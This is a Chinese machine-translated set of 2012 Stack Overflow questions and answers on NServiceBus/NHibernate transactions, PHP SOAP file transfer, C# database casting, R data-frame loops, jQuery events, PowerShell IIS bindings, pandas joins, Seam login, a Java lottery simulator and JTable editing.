> 赞同：0
> 
> 时间：2012-04-11T21:37:37.043
> 
> 标签：nhibernate, nservicebus, nservicebus3

尽管处理程序中没有引发异常，但 NServiceBus 重发消息 X 次时遇到了一个奇怪的问题。有一些关于 NHibernate 会话和 NSB 环境事务的信息。由于没有引发错误，我不能 100% 确定问题所在，因此无法真正决定要做什么。

我将 NSB 配置为 Castle Windsor，如下所示：

```
IWindsorContainer container = new WindsorContainer(new XmlInterpreter());
container.Install(new ContainerInstaller());
container.Install(new UnitOfWorkInstaller(AppDomain.CurrentDomain.BaseDirectory, Castle.Core.LifestyleType.Scoped));
container.Install(new FactoryInstaller(AppDomain.CurrentDomain.BaseDirectory));
container.Install(new RepositoryInstaller(AppDomain.CurrentDomain.BaseDirectory));

Configure.With()
    .CastleWindsorBuilder(container)
    .FileShareDataBus(Properties.Settings.Default.DataBusFileSharePath)
    .MsmqTransport()
        .IsTransactional(true)
        .PurgeOnStartup(false)
    .UnicastBus()
         .LoadMessageHandlers()
         .ImpersonateSender(false)
     .JsonSerializer(); 
```

像这样`UnitOfWorkInstaller`注册工作单元（NHibernate 会话）：

```
public void Install(IWindsorContainer container, IConfigurationStore store)
{
    var fromAssemblyDescriptor = AllTypes.FromAssemblyInDirectory(new AssemblyFilter(_installationPath));
    container.Register(fromAssemblyDescriptor
        .IncludeNonPublicTypes()
        .Pick()
        .If(t => t.GetInterfaces().Any(i => i == typeof(IUnitOfWork)) && t.Namespace.StartsWith("Magma"))
        .WithService.AllInterfaces()
        .Configure(con => con.LifeStyle.Is(_lifeStyleType).UsingFactoryMethod(k => k.Resolve<IUnitOfWorkFactory>().Create())));
} 
```

因此，每次消息到达时，所有存储库都使用相同的工作单元。我读到手动回滚当前事务会导致错误（我真的不知道为什么），而且我还知道 NSB 为每个传输消息创建一个子容器，并且这个子容器在消息处理后被释放。问题是当子容器被处理时，工作单元是这样处理的：

```
 public void Dispose()
    {
        if (!_isDisposed)
        {
            DiscardSession();
            _isDisposed = true;
        }
    }

    private void DiscardSession()
    {
        if (_transaction != null && _transaction.IsActive)
        {
            _transaction.Dispose();
        }
        if (Session != null)
        {
            Session.Dispose();
        }
    } 
```

我的处理程序的结构如下：（_unitOfWork 作为构造函数依赖项传递）

```
 public void Handle(<MessageType> message)
    {
        using (_unitOfWork)
        {
            try
            {
                // do stuff
                _unitOfWork.Commit();
            }
            catch (Exception ex)
            {
                _unitOfWork.Rollback();

                // rethrow so the message stays in the queue
                throw;
            }
        }
    } 
```

我发现如果我不提交工作单元（刷新会话并提交事务），我会收到一条错误消息，提示消息已重试超过最大重试计数 bla bla bla ...

所以它似乎与 NHibernate 会话以及它的创建和处理方式有关，但由于它是在工作单元中创建的，所以我不能真正使用会话工厂。我读到我可以使用 IMessageModule 来创建和处理会话，但是我不知道这是否是正确的方法，因为我首先不明白是什么导致了错误。

回顾一下：

*   我正在使用一个范围内的工作单元，以便所有使用它的处理程序依赖项将共享相同的实例（感谢子容器，顺便说一句：我已经将工作单元设置为瞬态，认为子容器将处理所有瞬态对象作为该容器中的单例，但我看到工作单元没有共享，所以这就是为什么它设置为范围）

*   我将我的处理程序包装在一个`using(_unitOfWork) { }`语句中，以在每次处理后处理工作单元。

*   当工作单元被释放时，NHibernate 会话也被释放

*   如果我没有显式调用`Commit`，`_unitOfWork`则消息重试超出最大重试次数，然后引发错误。

是什么导致了这种行为？IMessageModule 是这个问题的答案吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-12T15:36:32.320

我想我把它缩小了一点......我删除了所有的`using(_unitOfWork)`，`_unitOfWork.Commit()`和 ，`_unitOfWork.Rollback()`并让 NSB`TransactionScope`完成提交或回滚事务的工作，因为 NHibernate 的 Session 正在 NSB 事务范围内登记。

我还开始使用 NHibernate 会话的事务 ( `Session.Transaction`)，而不是通过`Session.BeginTransaction()`并使用它来获取对它的引用。我已经复制/粘贴了我的 UoW 实现，以便您可以看到差异（旧代码在注释中）。

我不知道我的更改是否解释了除了使用会话的事务并删除刷新，因为它在事务提交中处理似乎已经解决了问题......我不必`Commit`按顺序显式调用该方法以便消息被成功处理。这是我的 UoW 实现：

```
public class NHibernateUnitOfWork : INHibernateUnitOfWork
{
    //private ITransaction _transaction;
    private bool _isDisposed;
    private bool _isInError;

    public ISession Session { get; protected set; }

    public NHibernateUnitOfWork(ISession session)
    {
        Contract.Requires(session != null, "session");
        Session = session;

        //_transaction = Session.BeginTransaction();

        // create a new transaction as soon as the session is available
        Session.BeginTransaction();
        _isDisposed = false;
        _isInError = false;
    }

    public void MarkCreated(Object entity)
    {
        // assert stuff

        try
        {
            Session.SaveOrUpdate(entity);
            //Session.Flush();
        }
        catch (HibernateException ex)
        {
            HandleError();
            throw;
        }
    }

    public void MarkUpdated(Object entity)
    {
        // assert stuff

        try
        {
            Session.Update(entity);
            //Session.Flush();
        }
        catch (HibernateException ex)
        {
            HandleError();
            throw;
        }
    }

    public void MarkSavedOrUpdated(Object entity)
    {
        // assert stuff

        try
        {
            Session.SaveOrUpdate(entity);
            //Session.Flush();
        }
        catch (HibernateException)
        {
            HandleError();
            throw;
        }
    }

    public void MarkDeleted(Object entity)
    {
        // assert stuff

        try
        {
            Session.Delete(entity);
            //Session.Flush();
        }
        catch (HibernateException ex)
        {
            HandleError();
            throw;
        }
    }

    public void Commit()
    {
        // assert stuff

        try
        {
            //Session.Flush();
            //_transaction.Commit();
            Session.Transaction.Commit();
        }
        catch (HibernateException ex)
        {
            HandleError();
            throw;
        }
    }

    public void Rollback()
    {
        // assert stuff

        try
        {
            //if (!_transaction.WasRolledBack)
            //{
            //    _transaction.Rollback();
            //}
            Session.Transaction.Rollback();
        }
        catch (HibernateException ex)
        {
            HandleError();
            throw;
        }
    }

    public void Dispose()
    {
        if (!_isDisposed)
        {
            DiscardSession();
            _isDisposed = true;
        }
    }

    private void DiscardSession()
    {
        //if (_transaction != null && _transaction.IsActive)
        //{
        //    _transaction.Dispose();
        //}
        if (Session != null)
        {
            try
            {
                // rollback all uncommitted changes
                if (Session.Transaction != null && Session.Transaction.IsActive)
                {
                    Session.Transaction.Rollback();
                }
                //Session.Clear();
                Session.Close();
            }
            catch (Exception)
            { }
            finally
            {
                Session.Dispose();
            }
        }
    }

    private void HandleError()
    {
        _isInError = true;
        //if (_transaction != null && _transaction.IsActive)
        //{
        //    _transaction.Rollback();
        //}
        if (Session.Transaction != null && Session.Transaction.IsActive)
        {
            Session.Transaction.Rollback();
        }
    }

    // assert methods
} 
```

这有什么意义吗？我仍然不知道是什么首先导致了错误，但这似乎与在事务范围完成之前处理 NHibernate Session 有关。

# php - 在 PHP 中处理 Web 服务流

> ID：10114371
> 
> 赞同：1
> 
> 时间：2012-04-11T21:37:59.383
> 
> 标签：php, web-services, streaming, wso2

美好的一天，伙计们。

我需要使用作为文件流式传输的 Web 服务（它接收文件 ID 并通过流返回文件）。

然后在 PHP 中我必须处理这个过程。我一直在寻找如何做到这一点的解决方案，因为据我所知，PHP 中的本机肥皂客户端不具备这些功能。

我找到了处理二进制附件 (MTOM) 的 WSO2 (Web Services Framework for PHP)。

我尚未对其进行测试，但真正的问题是，根据您的经验，使用具有这些特征的 Web 服务最聪明的方法是什么？

非常感谢您的宝贵时间。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T23:27:40.180

`WSO2 WSF/PHP``MTOM`使用其他语言支持的标准进行文件流传输是一种更好更复杂的方法。

`MTOM`用于`base64`对文件进行编码，如果您不想使用，您可以在 on 上实现`WSO2`

不知道为什么要`stream`请注意，`stream`到目前为止，您可以随时打开任何文件，因为您拥有该文件的副本，所以我认为这不是最重要的..关键是将文件发送`safely`到服务器

使用示例`SoapClient`

客户

```
ini_set("soap.wsdl_cache_enabled", "0");
$client=new SoapClient(PATH_TO_WSDL,array('encoding'=>'ISO-8859-1'));
$data = file_get_contents(PATH_TO_FILE);
$ret = $client->recieveFile(base64_encode($data)); 
```

服务器

```
ini_set("soap.wsdl_cache_enabled", "0");

const  PATH_TO_WSDL = "b.php?wsdl" ;
$client=new SoapClient(PATH_TO_WSDL,array('encoding'=>'ISO-8859-1'));
$data = file_get_contents(PATH_TO_FILE);
$ret = $client->recieveFile(base64_encode($data)); 
```

请注意，对于非常大`base64`的文件`33%`，建议将文件分成块来增加文件

# c# - 如何将数据库中的数据显示到文本框

> ID：10114372
> 
> 赞同：1
> 
> 时间：2012-04-11T21:38:03.800
> 
> 标签：c#, database, ms-access, richtextbox

我有一个 MS Access 数据库，它有一个包含几列的表。当我单击一个按钮时，我想从数据库的一列中获取字符串数据行并将其显示在富文本框中。我创建了以下代码：

```
 public static string DisplayListOfTeams()
    {
        //create a data table object to hold data retrieved from DB
        DataSet ds = new DataSet();

        //set SQL query to string variable
        String sqlQuery = "SELECT * FROM Team";

        //instantiate new OleDbDataAdapter object
        OleDbDataAdapter adpTeams = new OleDbDataAdapter(sqlQuery, aConnection);

        //add data in DB to the dataset object/table
        adpTeams.Fill(ds, "TeamTable");            

        string myValue;

        if (ds.Tables["TeamTable"].Rows.Count > 0)
        {
            //You must cast the value because it is an object
            myValue = (string)ds.Tables["TeamTable"].Rows[0][0];
        }
        else
        {
            myValue = "No Data found";
        }
        return myValue;
    }

 richTextBox1.Text = TeamsDA.DisplayListOfTeams(); 
```

我在以下行收到“无法将'System.Int32'类型的对象转换为'System.String'”错误：

```
myValue = (string)ds.Tables["TeamTable"].Rows[0][0]; 
```

我不确定我做错了什么或如何去做我想做的事情。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T21:41:06.467

一（两个？）字：[ToString](http://msdn.microsoft.com/en-us/library/system.object.tostring.aspx)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T21:43:30.797

不要投射它......改用 ToString() 。

如果你强制转换它不会转换返回，它只会尝试作为类型发送。如果您使用 ToString()，如果可能，它将转换为正确的方式。

如果我错了，请纠正我。但我确信 ToString() 会起作用。

编辑 ：

修复了区分大小写的错误。感谢 digEmAll

# c# - Monodroid Visual Studio Android 应用程序未复制到设备

> ID：10114375
> 
> 赞同：0
> 
> 时间：2012-04-11T21:38:45.840
> 
> 标签：c#, android, visual-studio-2010, android-emulator, xamarin.android

嗨，我是 Android 应用程序世界的新手。我已经为 Visual Studio 安装了 Monodroid 插件。我为 Android 应用程序创建了一个新的 Mono。项目构建，我启动我的模拟器，我在选择设备对话框中选择我的模拟器，然后对话框显示将应用程序复制到设备......然后对话框消失。但是，该应用程序从未出现在我的模拟器中。项目构建良好，没有错误，但应用程序从未出现在模拟器中。有没有人遇到过这个？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T21:43:06.767

我的猜测是该应用程序正在快速启动并崩溃。检查 Android 调试日志以查看那里是否有任何异常或消息。

[http://docs.xamarin.com/android/advanced_topics/android_debug_log](http://docs.xamarin.com/android/advanced_topics/android_debug_log)

# r - 如何遍历数据集以仅绘制特定列？

> ID：10114376
> 
> 赞同：0
> 
> 时间：2012-04-11T21:38:49.463
> 
> 标签：r, loops, ggplot2, dataframe

图表，我已经下来了。挑战是我有 _exact_same_code_ 用于绘制多个数据集（更确切地说，是一个 LARGE 数据集的子集），但我似乎无法正确获取循环代码来正确替换 $。

数据集，df1, df2, df3...的形式：

```
OBSDATE     REGION  AVG_RESP  P10  P90
2012-02-01  APAC    1.276     0.78 3.45
2012-02-01  EMEA    2.341     1.23 5.67
2012-02-02  APAC    1.343     0.89 3.21
2012-02-02  EMEA    2.473     1.37 5.98 
```

该图更复杂，但像这样：

```
avgMx <- quantile(df1$P90,0.95)
ggplot(df1,aes(x=OBSDATE,y=AVG_RESP))+coord_cartesian(ylim=c(0,avgMx))+geom_ribbon(aes(ymin=P10,ymax=P90),fill="gray60",alpha=0.33)+geom_line(aes(x=OBSDATE,y=AVG_RESP),color="#007DB1",size=0.5)+facet_wrap(~REGION) 
```

如果我用数据集名称定义一个向量或列表（两者似乎都失败并显示相同的错误消息），我无法让循​​环工作以找到任何描述性值（如上面的分位数甚至最大值！）

```
filenames <- c("df1","df2","df3") 
```

我想让这样的东西工作

```
for (i in filenames) {
   quantile(i$AVG_RESP,0.95)
   max(i$AVG_RESP)
} 
```

但是我得到关于 $ 对原子向量无效的错误。经过调查，这似乎没有产生任何可用的结果。

所以，我可以让它工作：

```
max(df1$AVG_RESP) or max(df1['AVG_RESP']) 
```

他们都会从上面输出 2.473。但是，这不会飞：

```
for (i in pagesC) max(i['AVG_RESP']) 
```

它什么也不做。将其更改为：

```
for (i in pagesC) print(max(i['AVG_RESP'])) 
```

给出 NA 的实例。

我完全被困住了。任何帮助将不胜感激！

编辑：我修复了导致错误的数据 - 现在应该可以重现了。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T21:57:11.253

`i`是一个字符串；您想要名称保存在 中的对象`i`。这就是`get()`功能。（未经测试，因为您提供的内容不可复制。）

```
for (filename in filenames) {
   i <- get(filename)
   quantile(i$AVG_RESP,0.95)
   max(i$AVG_RESP)
} 
```

不过，这可能不是解决问题的最佳方法。将所有数据框放在一个列表中并循环遍历该列表`lapply`可能是一种更好的方法（泰勒在他的回答中描述了这一点）。此外，如果这些是您由更大的单个数据框组成的子集，那么更好的方法是使用`plyr`包中的某些内容来定义如何拆分大数据框以及如何处理每个部分.

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-11T21:48:09.160

您的代码不可重现，所以这是我对您想要的最好的猜测：

```
df1 <- df2 <- df3 <- read.table(text="OBSDATE     REGION  AVG_RESP  P10  P90
2012-02-01  APAC    1.276     0.78 3.45
2012-02-01  EMEA    2.341     1.23 5.67
2012-02-02  APAC    1.343     0.89 3.21
2012-02-02  EMEA    2.473     1.37 5.98
2012-02-01  APAC    1.276     0.78 3.45
2012-02-01  EMEA    2.341     1.23 5.67
2012-02-02  APAC    1.343     0.89 3.21
2012-02-02  EMEA    2.473     1.37 5.98
2012-02-01  APAC    1.276     0.78 3.45
2012-02-01  EMEA    2.341     1.23 5.67
2012-02-02  APAC    1.343     0.89 3.21
2012-02-02  EMEA    2.473     1.37 5.98", header=TRUE)

info <- function(dataframe){
    c(quantile(dataframe$AVG_RESP,0.95), max(dataframe$AVG_RESP))
}

LIST <- list(df1, df2, df3)
lapply(LIST, info)   
#Or you may want to use sapply if you want it to return a matrix
sapply(LIST, info) 
```

R 可以使用循环，但这确实不是 R 做事的方式。

# jquery - jQuery - 如何为绑定到同一对象的多个事件分配唯一函数？

> ID：10114378
> 
> 赞同：2
> 
> 时间：2012-04-11T21:38:57.227
> 
> 标签：jquery, events, bind, gesture

简单的例子：

```
$('foo').bind('doubletap swiperight', function() {}); 
```

所以，我正在努力提高效率。也许我试图变得太高效，但我想做的是将事件绑定到对象 ONCE，然后说“如果 swiperight 这样做。如果双击这样做。”

这可能吗？？

我在这里先向您的帮助表示感谢！

亚历克斯

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-11T21:40:34.763

您可以使用以下方法从处理函数中确定事件的类型`event.type`：

```
$('foo').bind('doubletap swiperight', function(e) {
    if (e.type == "doubletap") {
        // tap code
    }
    else if (e.type == "swiperight") {
        // swipe code
    }
}); 
```

# iis - 使用 Powershell 从 IIS 中删除 net.msmq 绑定

> ID：10114380
> 
> 赞同：1
> 
> 时间：2012-04-11T21:39:08.637
> 
> 标签：iis, powershell, iis-7.5, msmq

使用 Powershell 自动化一些 IIS 工作。我需要使用此处列出的方法添加 net.msmq 绑定： [为什么 Powershell 的 New-WebBinding commandlet 创建不正确的 HostHeader？](https://stackoverflow.com/questions/9424362/why-powershells-new-webbinding-commandlet-creates-incorrect-hostheader)

我使用类似的东西添加的地方

```
New-ItemProperty -Path 'IIS:\Sites\Default Web Site' -Name Bindings -value @{protocol="net.msmq"; bindingInformation="server.domain.com"} 
```

所以现在我需要自动删除该绑定（例如队列服务器更改）。我已经搞砸了所有的 Collection cmdlet，我无法找到删除项目的方法。

```
Get-ItemProperty -Path 'IIS\Sites\Default Web Site' -Name bindings 
```

将返回一个集合。我可以使用 ForEach 进行迭代，但是一旦找到它，我似乎找不到删除项目的魔法命令。

有什么想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-12T03:08:41.153

这对我有用：

```
$prop = (get-ItemProperty -Path 'IIS:\Sites\Default Web Site' -Name bindings).Collection | ? {$_.Protocol -ne "net.msmq"}
Set-ItemProperty "IIS:\sites\Default Web Site" -name bindings -value $prop 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-04-24T10:20:15.833

删除-ItemProperty 'IIS:\Sites\DemoSite' -名称绑定 -AtElement @{protocol="http";bindingInformation="*:80:DemoSite2"}

直接上技术网......

# php - 走进foreach

> ID：10114395
> 
> 赞同：3
> 
> 时间：2012-04-11T21:40:29.843
> 
> 标签：php, foreach

如何在 foreach 中每 5 个（例如）循环执行一次操作？

我添加`$i++`了如何逐步检查？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-04-11T21:44:13.413

使用模来确定偏移量。

```
$i = 0;

foreach ($array as $a) {
   $i++;
   if ($i % 5 == 0) {
       // your code for every 5th item
   }

   // your inside loop code
} 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-04-11T21:41:45.990

除非你在每次迭代中单独做某事，否则不要。

使用 for 循环并每次将计数器递增 5：

```
$collectionLength = count($collection);

for($i = 0; $i < $collectionLength; i+=5)
{
    // Do something
} 
```

否则，您可以使用模运算符来确定您是否处于第五次迭代之一：

```
if(($i + 1) % 5 == 0) // assuming i starts at 0
{
    // Do something special this time
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-11T21:48:43.650

```
 for($i = 0; $i < $items; $i++){
    //for every 5th item, assuming i starts at 0 (skip)
        if($i % 5 == 0 && $i != 0){
            //execute your code
        }
    } 
```

# pandas - 熊猫：简单的“加入”不起作用？

> ID：10114399
> 
> 赞同：22
> 
> 时间：2012-04-11T21:40:38.143
> 
> 标签：pandas

我喜欢认为我不是白痴，但也许我错了。谁能向我解释为什么这不起作用？我可以使用“合并”来达到预期的效果。但我最终需要加入多个`pandas` `DataFrames`，所以我需要让这个方法起作用。

```
In [2]: left = pandas.DataFrame({'ST_NAME': ['Oregon', 'Nebraska'], 'value': [4.685, 2.491]})

In [3]: right = pandas.DataFrame({'ST_NAME': ['Oregon', 'Nebraska'], 'value2': [6.218, 0.001]})

In [4]: left.join(right, on='ST_NAME', lsuffix='_left', rsuffix='_right')
Out[4]: 
  ST_NAME_left  value ST_NAME_right  value2
0       Oregon  4.685           NaN     NaN
1     Nebraska  2.491           NaN     NaN 
```

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2012-04-11T22:06:26.303

尝试使用[`merge`](http://pandas.pydata.org/pandas-docs/stable/merging.html#database-style-dataframe-joining-merging)：

```
In [14]: right
Out[14]: 
    ST_NAME  value2
0    Oregon   6.218
1  Nebraska   0.001

In [15]: merge(left, right)
Out[15]: 
    ST_NAME  value  value2
0  Nebraska  2.491   0.001
1    Oregon  4.685   6.218

In [18]: merge(left, right, on='ST_NAME', sort=False)
Out[18]: 
    ST_NAME  value  value2
0    Oregon  4.685   6.218
1  Nebraska  2.491   0.001 
```

`DataFrame.join`是一种遗留方法，显然不进行列连接（最初它使用 on 参数对列进行索引，因此称为“遗留”）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2018-11-16T20:51:38.793

我可以确认，Pandas 加入方法有问题。在我的情况下，两个键都是长字符串（18 个字符），结果好像 pandas 只匹配前几个字符。合并功能正常工作。请不要使用 join 功能，它应该从可用的方法中真正删除，否则它会搞砸大时间。

# annotations - 将活动用户存储在会话范围内的 Seam 框架

> ID：10114400
> 
> 赞同：0
> 
> 时间：2012-04-11T21:40:47.980
> 
> 标签：annotations, seam

当有人登录时，我想将 activeUser 对象存储在会话范围中，我将其转发用于用户特定的操作，但是当管理员尝试登录时出现问题，因为管理员不是默认用户，所以 @out 注释会导致错误错误代码熟悉 = @Out 属性需要非空值：authenticator.activeUser 我的逻辑代码如下；（注意：管理员和标准用户使用相同的登录面板）

```
 @Out(scope = ScopeType.SESSION, required = true)
    private User activeUser;

public boolean authenticate() throws Exception {
    // SELECT OBJECT(user) FROM User user WHERE user.name = :name and
    // user.password = :pass

    try {
        // create a query for getting a user with specified parameters if no
        // user exist throw an exception
        setActiveUser((User) entityManager
                .createQuery(
                        "select u from User u where u.userName= :uname and u.password = :pass")
                .setParameter("uname", credentials.getUsername())
                .setParameter("pass", credentials.getPassword())
                .getSingleResult());

        identity.addRole("user");
        return true;

    } catch (Exception e) {
        // so there is no any normal user now looking for any admin entry
        System.out.println("there is no any member looking for admin");

        try {

            Admin admin = (Admin) entityManager
                    .createQuery(
                            "select a from Admin  a where a.username = :uname and a.pass = :p")
                    .setParameter("uname", credentials.getUsername())
                    .setParameter("p", credentials.getPassword())
                    .getSingleResult();

            identity.addRole("admin");
            System.err.println("found admin");
            return true;

        } catch (Exception e2) {
            System.err.println("admin bulunamadı");
            throw e2;

        }

    }
} 
```

in @out required 必须为真，因为在用户特定的 crud 操作中，我使用用户 ID 记录它们。我怎么解决这个问题。设置 required=false 就足够了吗？

另一方面，如果没有用户发现该`entitymanager.resultlist()`方法将引发异常。所以我知道@out 注释可以工作，除非方法抛出任何异常？

# java - java随机数生成器 - 彩票

> ID：10114401
> 
> 赞同：0
> 
> 时间：2012-04-11T21:40:49.897
> 
> 标签：java, random

我的代码看起来很业余，因为我是二年级的软件工程专业学生。

我创建了一个彩票号码生成器，并注意到了奇特但一致的结果。我的程序试图匹配之前的欧洲百万彩票开奖号码。我跟踪它所花费的尝试次数，我还跟踪我匹配 3、4、5 和 6 个数字的次数。

尝试的范围在 100 万到 4.22 亿之间。即我会运行程序 10 次，我会达到一个范围，我还会跟踪每次运行所花费的时间长度。

我考虑了许多事情，例如防止随机数被多次使用，并且此检查是针对可能的彩票号码的 HashMap 进行的。如果我在哈希图中找到随机数，我将其添加到数组列表中，然后从哈希图中删除该数字。

**我的问题围绕着结果。**

在所有匹配彩票号码的尝试中，我获得 3 个号码的机会平均为 3.13%。4 个数字下降到 0.28%，5 个数字下降到 0.00012%，6 个数字下降到 0.00022%。

可以理解，随着彩票号码数量的增加，中奖的机会将会减少，但是无论我有 100 万次还是 1 亿次尝试，这个比率都相同或非常接近。

如果您有兴趣，我的最小尝试次数是 1,088,157，大约需要 6 秒或 6612 毫秒。

最大尝试次数为 422,036,905 次，耗时 26 分钟或 1589867 毫秒。

由于我使用的是 Java Random 库，因此我只是想弄清楚这一点。还是我应该简单地将其归结为概率？

我的代码是不必要的 225 行，如果您想查看特定部分或希望查看整个内容，请提出此要求。下面是前 5 个数字的随机数生成示例。

```
//stores all possible lottery numbers
public static  HashMap<Integer,Integer> randRange = new HashMap<Integer,Integer>();

//stores bonus ball numbers
public static  HashMap<Integer,Integer> boRange = new HashMap<Integer,Integer>();

//stores lottery number output
public static  ArrayList<Integer> lotNum = new  ArrayList<Integer>();

//stores bonus ball output
public static  ArrayList<Integer> boNum = new  ArrayList<Integer>();

public static void randomInt(){

    Random rand = new Random();

    //generate a random number
    int RandInt = rand.nextInt(51);
    int boInt = rand.nextInt(12);

    //loop used to get unique random number
    int count=0;
    while(count!=5){

        //check if random number exists
        if(randRange.get(RandInt)!=null)
        {
            //finalise random number
            RandInt=randRange.get(RandInt);

            //add to ArrayList
            lotNum.add(RandInt);

            //remove number
            //ensures next random number is unique
            randRange.remove(RandInt);

            count++;                
        }

        else
        {
            //get a new random number 
            //and start process again
            RandInt = rand.nextInt(51);
        }
    }
} 
```

**编辑：**

首先很抱歉我不能投票，因为我的声望不到 15。所有答案都很有帮助，包括评论。

感谢所有成员的建议，我改进了我的程序，不出所料地发现了我的代码中的一个错误。@digitaljoel，您在匹配 5 个和 6 个数字的概率上是正确的。我设置了错误的计算，例如，对于百万欧元抽奖的数字 11,20 30,35,45,2,3 匹配 3 是 0.7%，4 是 0.05%，5 是 0.00273%，6 是 0.000076 %。

感谢@maybewecouldstealavan，我改变了我的洗牌方法，简单地填充一个 ArrayList 并洗牌列表，获取前五个数字并对奖金球做同样的事情。好处是每秒检查的数量从每秒 150-20 万次检查增加到每秒 250-70 万次检查。

感谢@trutheality，因为在某些情况下，如果我检查了 1000 或 1,000,000 个匹配项，则变化是相似的或微小的。

@LeviX 再次感谢可能组合的计算。我在程序中使用了这个，发现赢得彩票所花费的时间超过了组合的总数。我很可能会产生重复的随机数。由此我可能会创建所有可能的组合并随机选择每个组合，直到程​​序找到匹配项。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-11T21:47:00.573

> 在所有匹配彩票号码的尝试中，我获得 3 个号码的机会平均为 3.13%。4 个数字下降到 0.28%，5 个数字下降到 0.00012%，6 个数字下降到 0.00022%。
> 
> 可以理解，随着彩票号码数量的增加，中奖的机会将会减少，但是无论我有 100 万次还是 1 亿次尝试，这个比率都相同或非常接近。

这实际上一点也不奇怪。你最终在这里做的是估计正确猜测 3、4、5 或 6 个数字的概率。拥有更多样本只会使您的估计值的变化更小，但即使“少”为 100 万个样本，您的估计值也应该接近确切的概率（您可以通过做一些数学计算）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T22:15:18.290

据我了解，百万欧元有两个不同的部分。5 个球，然后是 2 个奖金球。您可以通过计算获胜的确切概率来检查程序的数学运算。我相信你可以谷歌它，但它很容易计算。

从 50 个球中得到 5 个球的概率（顺序无关紧要）

```
P(A) = 50!/5!(50-5)! = 2,118,760 
```

从 11 个球中得到 2 个球的概率（顺序无关紧要）

```
P(B) 11!/2!(11-2)! = 55 
```

这两个事件是独立的，所以将它们相乘。

```
P(A) * P(B) = P(A&B)
2,118,760 * 55 = 116,531,800 
```

因此，中奖的机会为：

```
1 in 116,531,800 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-11T23:36:39.667

你的意思是你期望你赢得的次数比例更“随机”吗？如果这就是您的意思，那么@truthreality 是非常正确的。为了进一步阅读，您可以查看[大数定律](http://en.wikipedia.org/wiki/Law_of_large_numbers)和[中心极限定理](http://en.wikipedia.org/wiki/Central_limit_theorem)。

如果你问你的洗牌方法是否正确，那是因为它效率低下。您生成的随机数超出了必要的数量，因为您只是在发生欺骗时检查它们，并且在您选择球后不会创建新的随机数，因此您至少需要一个 HashMap.get （int）每个选择。

我可能会改用以下方法之一：

1) 创建一个包含所有球值的 ArrayList。对于每张图纸，使用`Collections.shuffle(yourArrList, rand)`将它们的克隆洗牌，然后只使用列表中的前 5 个球。

2) 同样，创建一个球值的 Array 或 ArrayList。然后自己实现一部分 shuffle 操作：从越来越小的可能性子集中进行选择，然后将不再适合刚刚选择的元素位置的元素换入。优点是您不需要对整个数组进行洗牌。这是我快速而肮脏的实现：

```
public static int[] choose(int[] array, int count, Random rand) {
    int[] ar = array.clone();
    int[] out = new int[count];
    int max = ar.length;
    for (int i = 0; i<count; i++) {
        int r = rand.nextInt(max); 
        //max is decremented, 
        //the selected value is copied out then overwritten 
        //by the last value, which would no longer be accessible
        max--;
        out[i]=ar[r];
        ar[r]=ar[max];
    }
    return out;
} 
```

可能还有改进的余地，尤其是在顺序无关紧要的情况下。

# java - JTable 不稳定行为

> ID：10114407
> 
> 赞同：0
> 
> 时间：2012-04-11T21:41:32.017
> 
> 标签：java, swing, jtable

我有一些旧的 Java 应用程序使用 JTable 来显示一些数据并允许输入。JTable 有 2 列。在 JTable 旁边，有一个将新行添加到 JTable 中的按钮。

我的问题是导航 JTable 时 Tab 和 Enter 键盘键和鼠标单击的行为。

我将尝试解释：假设 JTable 中有 5 行：

1.  如果我用鼠标单击一行，有时整行会突出显示，有时单元格会进入编辑模式（除了整行被突出显示）
2.  有时，选定的行会突出显示，但突出显示的行上方或下方的单元格会进入编辑模式
3.  如果我使用 Tab 从一个字段跳到另一个字段，可编辑字段始终位于突出显示的行上方。

还有其他问题。

**任何想法可能有什么问题？**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T22:03:45.407

这听起来有点奇怪。您是否完全使表无效并通知侦听器等行数已更改？

在您的表模型中，遍历*所有*TableModelListeners 并触发 TableModelEvent 'insert' 事件：

```
TableModelEvent event = new TableModelEvent(
                modelInstance,
                positionOfNewRow,
                positionOfNewRow,
                TableModelEvent.ALL_COLUMNS,
                TableModelEvent.INSERT);

for (TableModelListener l: listeners) {
    l.tableChanged(event);
} 
```

如果您无法解决问题，则可以为表编写自己的行为。

这些是一些有用的方法：

```
editCellAt(int row, int column);
rowAtPoint(Point point);
columnAtPoint(Point point); 
```

您可以将自己的侦听器添加到表中，以拦截事件并以您喜欢的任何方式编辑单元格。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T22:02:31.063

关闭表格单元格编辑。看看它的表现如何。通常，这可以通过将 TableModel.isCellEditable() 方法更改为简单地返回 false 来处理。

重新打开它。您的 JTable 实例是子类的吗？它是否覆盖了editCell（）？如果是这样，这就是将根据事件发生与否触发编辑的方法。该方法正在不恰当地打开编辑。如果该方法被覆盖，则该方法的实现很糟糕。

如果您的表没有子类化，请查找对 editCell() 的调用。那些可能不恰当地调用它，因此您可以查找这些调用并开始设置断点或日志语句。

# java - Java：编写自定义视频编解码器的指南

> ID：10114413
> 
> 赞同：14
> 
> 时间：2012-04-11T21:41:49.437
> 
> 标签：java, c++, codec, video-player

我有一个很奇怪的问题，但这里是：

是否有可能，是否有任何使用 C++ 或 Java 编写自定义视频编解码器的指南？

这是奇怪的部分：我不需要深入了解我不了解的有关音频和电影的大量信息。我真正需要的是如何在电影播放器​​和电影文件之间制作软件层的技术资料。

